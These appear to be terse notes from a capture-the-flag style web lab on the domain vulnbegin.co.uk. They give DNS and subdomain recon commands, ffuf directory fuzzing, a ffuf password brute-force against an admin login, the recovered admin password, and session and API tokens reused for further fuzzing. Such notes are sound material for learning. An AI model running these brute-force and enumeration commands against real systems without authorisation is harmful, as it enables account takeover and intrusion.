admin
159753

Domain: http://vulnbegin.co.uk/

```bash
nslookup -type=any vulnbegin.co.uk 8.8.8.8

dnsrecon -d ctvqeeay.vulnbegin.co.uk -D /usr/share/wordlists/dirb/common.txt -t brt

curl server.ctvqeeay.vulnbegin.co.uk -H "Cookie: $cookie"
```
theHarvester
```bash
theHarvester -d ctvqeeay.vulnbegin.co.uk -b all
```
ffuf
```bash
ffuf -u http://www.vulnbegin.co.uk/FUZZ -w /usr/share/wordlists/dirb/common.txt -H "Cookie: $cookie" -t 2 -p 0.1
```
burp username bruteforce
username: admin
fuff password bruteforce
```bash
ffuf -X POST -u http://ctvqeeay.vulnbegin.co.uk/cpadmin/login -d "username=admin&password=PFUZZ" -w /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt:PFUZZ -H "Cookie: $cookie" -H "Content-type: application/x-www-form-urlencoded" -t 4 -p 0.1 -fs 200
```
password: 159753
token=2eff535bd75e77b62c70ba1e4dcb2873

ffuf cpadmin [with cookie admin token]
```bash
ffuf -u http://ctvqeeay.vulnbegin.co.uk/cpadmin/FUZZ -w /usr/share/wordlists/dirb/common.txt -H "Cookie: $cookie; token=2eff535bd75e77b62c70ba1e4dcb2873"
```

|api_key|"X-Token: 492E64385D3779BC5F040E2B19D67742"|

ffuf doamin with X-Token
```bash
ffuf -u http://server.6h0qk1c9.vulnbegin.co.uk/FUZZ -w /usr/share/wordlists/dirb/common.txt -H "Cookie: $cookie" -H "X-Token: 492E64385D3779BC5F040E2B19D67742" -t 2 -p 0.1
```
